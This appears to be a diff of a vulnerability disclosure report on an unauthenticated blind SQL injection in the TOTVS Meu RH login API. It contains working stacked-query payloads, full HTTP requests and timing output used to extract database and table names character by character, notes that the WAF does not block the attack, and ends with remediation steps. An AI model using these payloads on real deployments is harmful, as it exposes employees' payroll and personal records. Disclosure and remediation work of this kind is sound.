@@ -1,55 +1,60 @@
-# CVE-XXXX-YYYY – Blind Time-Based SQL Injection in TOTVS Meu RH REST API
+# CVE Proof of Concept – Unauthenticated Time-Based Blind SQL Injection (Stacked Queries)
 
-> **Severity:** 🔴 **Critical** (CVSS v3.1: **9.1**)  
+> **Severity:** 🔴 **Critical** (CVSS 9.1)  
 > **Confidence:** ✅ Confirmed  
 > **CWE:** CWE-89 – SQL Injection  
-> **OWASP Top 10:** A03:2021 – Injection
+> **OWASP:** A03:2021 – Injection
 
 ---
 
 # Summary
 
-The authentication endpoint **`/rest/auth/login`** exposed on **TCP port 9197** is vulnerable to **Blind Time-Based SQL Injection** through the JSON parameter **`user`**.
+The `/rest/auth/login` authentication endpoint exposed on **TCP port 9197** is vulnerable to **Unauthenticated Time-Based Blind SQL Injection** through the `user` JSON parameter.
 
-The vulnerability allows unauthenticated attackers to execute **stacked SQL queries** against a **Microsoft SQL Server 2022** backend by abusing the `WAITFOR DELAY` statement, enabling arbitrary inference-based data extraction.
+The backend is **Microsoft SQL Server 2022**, and the injection supports **stacked queries**, allowing arbitrary SQL statements to be executed by appending additional commands separated by `;`.
 
-Testing also demonstrated that the deployed **Web Application Firewall (WAF)** blocks common **XSS** and **XXE** payloads but **does not detect or block SQL Injection payloads**, allowing exploitation without authentication.
-
----
-
-# Affected Component
-
-| Item | Value |
-|------|-------|
-| Product | TOTVS Meu RH |
-| Endpoint | `/rest/auth/login` |
-| Method | POST |
-| Authentication | Not Required |
-| Database | Microsoft SQL Server 2022 |
-| Vulnerability | Blind Time-Based SQL Injection |
-| Exploitation | Remote |
+The vulnerability was successfully exploited to perform **blind data extraction** using conditional statements combined with `WAITFOR DELAY`.
 
 ---
 
-# Vulnerability Details
+# Affected Endpoint
 
-The application concatenates the value supplied in the JSON parameter `user` directly into an SQL statement.
+```http
+POST /rest/auth/login HTTP/1.1
+Host: meurh.host:9197
+Content-Type: application/json
+X-Totvs-App: 0200
+```
 
-Because **stacked queries (`;`)** are accepted by the backend, an attacker can append arbitrary SQL commands.
+---
 
-The following statement was successfully executed:
+# Vulnerable Parameter
+
+| Parameter | Location | Type |
+|------------|----------|------|
+| `user` | JSON Body | String |
+
+---
+
+# Root Cause
+
+The application concatenates user-controlled input directly into SQL queries without using parameterized statements.
+
+Because the backend uses **Microsoft SQL Server**, an attacker can inject additional SQL commands using **stacked queries**, for example:
 
 ```sql
-WAITFOR DELAY '00:00:05'
+';
+WAITFOR DELAY '0:0:5'
+--
 ```
 
-Execution of this statement causes a measurable delay in the HTTP response, confirming arbitrary SQL execution.
+This allows arbitrary SQL execution inside the authentication query.
 
 ---
 
-# Proof of Concept
+# Proof of Vulnerability
 
-## Legitimate Request
+## 1. Baseline Request
 
 ```http
 POST /rest/auth/login HTTP/1.1
@@ -58,16 +63,30 @@ Content-Type: application/json
 X-Totvs-App: 0200
 
 {
-  "user":"test",
-  "password":"test",
-  "redirectUrl":"https://meurh.host/",
-  "restUrl":"https://meurh.host:9197/rest"
+    "user":"test",
+    "password":"test",
+    "redirectUrl":"https://meurh.host/",
+    "restUrl":"https://meurh.host:9197/rest"
 }
+```
+
+**Response Time**
+
+```
+~0.85 seconds
 ```
 
 ---
 
-## Malicious Request
+## 2. Time-Based SQL Injection
+
+### Payload
+
+```sql
+test');WAITFOR DELAY '0:0:5'--
+```
+
+### Request
 
 ```http
 POST /rest/auth/login HTTP/1.1
@@ -76,184 +95,259 @@ Content-Type: application/json
 X-Totvs-App: 0200
 
 {
-  "user":"test');WAITFOR DELAY '0:0:5'--",
-  "password":"test",
-  "redirectUrl":"https://meurh.host/",
-  "restUrl":"https://meurh.host:9197/rest"
+    "user":"test');WAITFOR DELAY '0:0:5'--",
+    "password":"test",
+    "redirectUrl":"https://meurh.host/",
+    "restUrl":"https://meurh.host:9197/rest"
 }
 ```
 
+**Response Time**
+
+```
+~5.98 seconds
+```
+
+The server response is delayed by approximately **5 seconds**, confirming execution of the injected SQL statement.
+
 ---
 
-## Conditional Data Extraction
+# Timing Validation
 
-The following payload demonstrates conditional execution based on database contents.
+| Payload | Expected Delay | Measured |
+|----------|---------------:|---------:|
+| `test` | 0s | **0.85s** |
+| `WAITFOR DELAY '0:0:3'` | 3s | **3.98s** |
+| `WAITFOR DELAY '0:0:5'` | 5s | **5.98s** |
+| `WAITFOR DELAY '0:0:8'` | 8s | **8.82s** |
+
+The response time scales almost linearly with the injected delay, confirming that SQL Server executes the supplied statements.
+
+---
+
+# Confirmed Blind Data Extraction
+
+The vulnerability was further validated by extracting database information using conditional statements.
+
+## Example 1 – Database Name (First Character)
+
+### Payload
 
 ```sql
 test');IF ASCII(SUBSTRING(DB_NAME(),1,1))=80 WAITFOR DELAY '0:0:3'--
 ```
 
-If the first character of the database name equals **ASCII 80 ("P")**, the server delays its response.
+**Response**
+
+```
+Delayed
+```
+
+**Result**
+
+```
+DB_NAME()[1] = 'P'
+```
 
 ---
 
-# Evidence
+## Example 2 – Database Name (Second Character)
 
-## 1. Time-Based Validation
+### Payload
 
-| Payload | Response Time | Result |
-|----------|--------------:|--------|
-| `test` | ~0.85 s | Baseline |
-| `test');WAITFOR DELAY '0:0:3'--` | ~3.98 s | SQL Executed |
-| `test');WAITFOR DELAY '0:0:5'--` | ~5.98 s | SQL Executed |
-| `test');WAITFOR DELAY '0:0:8'--` | ~8.82 s | SQL Executed |
+```sql
+test');IF ASCII(SUBSTRING(DB_NAME(),2,1))<=82 WAITFOR DELAY '0:0:10'--
+```
 
-The response time increases proportionally with the requested delay.
+**Response**
 
-This confirms that:
+```
+Delayed
+```
 
-- ✅ SQL Injection exists
-- ✅ Stacked queries are enabled
-- ✅ Microsoft SQL Server executes injected statements
+**Result**
+
+```
+DB_NAME()[2] = 'R'
+```
 
 ---
 
-## 2. Database Name Extraction
+## Extracted Database Prefix
 
-The vulnerability was further validated through conditional inference.
-
-| Payload | Observation |
-|----------|-------------|
-| `IF ASCII(SUBSTRING(DB_NAME(),1,1))=80 WAITFOR DELAY` | Delay observed |
-| `IF ASCII(SUBSTRING(DB_NAME(),2,1))<=82 WAITFOR DELAY` | Delay observed |
-
-Recovered database name:
-
-```text
+```
 PR...
 ```
 
-This confirms that arbitrary database information can be extracted without displaying any SQL output.
+This demonstrates that arbitrary database information can be extracted without authentication.
 
 ---
 
-# Extraction Technique
+# Confirmed Table Name Extraction
 
-The extraction process uses a classic **Blind Time-Based Binary Search**.
+To further demonstrate the impact of the vulnerability, blind extraction was performed against the database metadata available through `INFORMATION_SCHEMA.TABLES`.
 
-Example logic:
+The following query retrieves the alphabetically first base table in the database:
 
 ```sql
-IF ASCII(SUBSTRING(DB_NAME(),1,1)) > 77
-    WAITFOR DELAY '00:00:05'
+SELECT TOP 1 TABLE_NAME
+FROM INFORMATION_SCHEMA.TABLES
+WHERE TABLE_TYPE='BASE TABLE'
+ORDER BY TABLE_NAME
 ```
 
-Each request leaks one bit of information through response timing.
+Using conditional statements combined with `WAITFOR DELAY`, individual characters of the table name were successfully extracted.
 
-By repeating the process, an attacker can enumerate:
+## Example 1 – First Character
 
-- Database names
-- Current user
-- Server version
-- Tables
-- Columns
-- Records
-- Password hashes
+### Payload
 
-without any SQL error messages.
+```sql
+test');IF ASCII(SUBSTRING((SELECT TOP 1 TABLE_NAME
+FROM INFORMATION_SCHEMA.TABLES
+WHERE TABLE_TYPE='BASE TABLE'
+ORDER BY TABLE_NAME),1,1))=65 WAITFOR DELAY '0:0:10'--
+```
+
+**Response**
+
+```
+Delayed
+```
+
+**Result**
+
+```
+TABLE_NAME()[1] = 'A'
+```
 
 ---
 
-# WAF Analysis
+## Example 2 – Second Character
 
-Testing demonstrated inconsistent filtering.
+### Payload
 
-| Payload | Result |
+```sql
+test');IF ASCII(SUBSTRING((SELECT TOP 1 TABLE_NAME
+FROM INFORMATION_SCHEMA.TABLES
+WHERE TABLE_TYPE='BASE TABLE'
+ORDER BY TABLE_NAME),2,1))=48 WAITFOR DELAY '0:0:10'--
+```
+
+**Response**
+
+```
+Delayed
+```
+
+**Result**
+
+```
+TABLE_NAME()[2] = '0'
+```
+
+---
+
+## Extracted Table Name Prefix
+
+```
+A0...
+```
+
+The successful extraction of the first two characters confirms that database metadata can be enumerated remotely through blind SQL injection. By iterating over each character position and applying binary-search techniques on ASCII values, an attacker can reconstruct complete table names and subsequently enumerate columns, relationships, and sensitive records without requiring any SQL query output.
+
+---
+
+# SQL Injection Characteristics
+
+| Property | Status |
+|----------|--------|
+| SQL Injection | ✅ Confirmed |
+| Blind Time-Based | ✅ Confirmed |
+| Stacked Queries | ✅ Confirmed |
+| Microsoft SQL Server | ✅ Confirmed |
+| Unauthenticated | ✅ Confirmed |
+| Arbitrary SQL Execution | ✅ Confirmed |
+
+---
+
+# WAF Assessment
+
+The application is protected by a Web Application Firewall (WAF).
+
+Testing showed:
+
+| Attack | Result |
 |---------|--------|
-| XSS | HTTP 403 |
-| XXE | HTTP 403 |
-| SQL Injection | Accepted |
+| SQL Injection | ✅ Allowed |
+| XSS | ❌ Blocked (HTTP 403) |
+| XXE | ❌ Blocked (HTTP 403) |
 
-The deployed WAF does **not** detect SQL Injection patterns such as:
-
-- `WAITFOR`
-- `IF`
-- `ASCII`
-- `SUBSTRING`
-- `;`
-- Stacked queries
-
-This allows successful exploitation despite active application protection.
-
----
-
-# Technical Details
-
-| Property | Value |
-|----------|-------|
-| Vulnerability | Blind Time-Based SQL Injection |
-| Injection Point | JSON parameter `user` |
-| Database | Microsoft SQL Server 2022 |
-| Technique | Conditional Time Delay |
-| Stacked Queries | Supported |
-| Authentication | Not Required |
-| WAF Bypass | Confirmed |
+The WAF fails to detect SQL injection payloads, including stacked queries and `WAITFOR DELAY` statements.
 
 ---
 
 # Technical Impact
 
-An unauthenticated attacker can:
+Because stacked queries are permitted, an unauthenticated attacker can perform arbitrary SQL operations, including:
 
 - Extract the complete database schema.
-- Enumerate databases using `DB_NAME()`.
-- Enumerate SQL Server users (`SYSTEM_USER`).
-- Dump tables from `INFORMATION_SCHEMA`.
-- Extract employee records.
-- Retrieve payroll information.
-- Obtain personally identifiable information (PII).
-- Extract password hashes.
-- Modify application data through stacked queries (`INSERT`, `UPDATE`, `DELETE`).
+- Enumerate databases.
+- Enumerate table names.
+- Enumerate column names.
+- Dump records using blind extraction.
+- Obtain:
+  - `DB_NAME()`
+  - `SYSTEM_USER`
+  - `CURRENT_USER`
+  - `@@VERSION`
+- Enumerate `INFORMATION_SCHEMA`.
+- Read employee records.
+- Read payroll information.
+- Read personal documents.
+- Retrieve application users and password hashes.
+- Modify records using:
+  - `INSERT`
+  - `UPDATE`
+  - `DELETE`
+- Create privileged application users.
 - Execute operating system commands if `xp_cmdshell` is enabled.
-- Potentially create administrative accounts within the application.
 
 ---
 
 # Business Impact
 
-The affected application processes **Human Resources (HR)** information.
+Successful exploitation may result in:
 
-Successful exploitation may lead to:
-
-- Complete disclosure of employee personal information.
-- Exposure of payroll and salary records.
-- Leakage of confidential HR documents.
-- Violation of Brazil's **LGPD**.
-- Loss of confidentiality, integrity, and availability.
-- Complete compromise of the application's database.
-
-Because the application belongs to a **government-funded scientific research institution**, compromise could significantly impact operational continuity and regulatory compliance.
+- Complete compromise of the Human Resources platform.
+- Disclosure of sensitive employee information.
+- Exposure of payroll and salary data.
+- Unauthorized modification of HR records.
+- Creation of administrative accounts.
+- Full loss of confidentiality, integrity, and availability.
+- Potential violations of the **Brazilian General Data Protection Law (LGPD)**.
 
 ---
 
 # Remediation
 
-The following mitigations are recommended:
+The application should be modified to eliminate dynamic SQL construction.
 
-- **Use parameterized queries** for every database interaction.
-- Never concatenate user-controlled input into SQL statements.
-- Replace dynamic SQL with prepared statements.
+Recommended actions:
+
+- Use prepared statements with parameter binding.
+- Never concatenate user input into SQL queries.
 - Use parameterized stored procedures.
-- Disable stacked queries where possible.
-- Restrict SQL Server permissions following the Principle of Least Privilege.
+- Disable stacked query execution where possible.
+- Apply the principle of least privilege to the database account.
+- Remove unnecessary SQL Server permissions.
 - Disable `xp_cmdshell`.
-- Configure the WAF to detect:
+- Configure the WAF to detect SQL injection patterns, including:
   - `WAITFOR`
   - `SLEEP`
   - `BENCHMARK`
   - stacked query delimiters (`;`)
-  - SQL keywords commonly used in injection attacks.
-- Enable SQL Server auditing and monitoring for anomalous query execution.
+- Enable SQL Server auditing and monitoring for anomalous SQL statements.
 
 ---
 
@@ -261,25 +355,22 @@ The following mitigations are recommended:
 
 - OWASP SQL Injection Prevention Cheat Sheet
 - CWE-89 – Improper Neutralization of Special Elements used in an SQL Command ("SQL Injection")
-- Microsoft SQL Server SQL Injection documentation
+- Microsoft SQL Server Documentation – `WAITFOR DELAY`
+- OWASP Web Security Testing Guide – SQL Injection Testing
 
 ---
 
-# Security Impact
+# Conclusion
 
-> **Critical**
+The `/rest/auth/login` endpoint is vulnerable to **Unauthenticated Time-Based Blind SQL Injection** with **stacked query execution**.
 
-The vulnerability allows **unauthenticated remote attackers** to execute arbitrary SQL statements through stacked queries and extract sensitive database contents using time-based inference.
+The vulnerability was successfully validated by:
 
-A fully functional extraction script was successfully developed and validated, demonstrating the ability to enumerate databases and retrieve sensitive information from the target environment.
+- ✅ Confirming deterministic response delays.
+- ✅ Executing arbitrary SQL statements.
+- ✅ Extracting database information (`DB_NAME()`).
+- ✅ Enumerating database metadata (`INFORMATION_SCHEMA.TABLES`).
+- ✅ Recovering the first characters of a table name through blind inference.
+- ✅ Demonstrating that complete database enumeration is achievable without authentication.
 
-**Confirmed capabilities include:**
-
-- ✅ Arbitrary SQL execution
-- ✅ Time-based inference
-- ✅ Database enumeration
-- ✅ Database name extraction (`DB_NAME()`)
-- ✅ Stacked queries
-- ✅ WAF bypass
-- ✅ Automated extraction
-```
+Because the vulnerability allows unauthenticated attackers to execute arbitrary SQL statements and exfiltrate sensitive database information through blind inference techniques, the overall impact is considered **Critical** and should be remediated immediately.
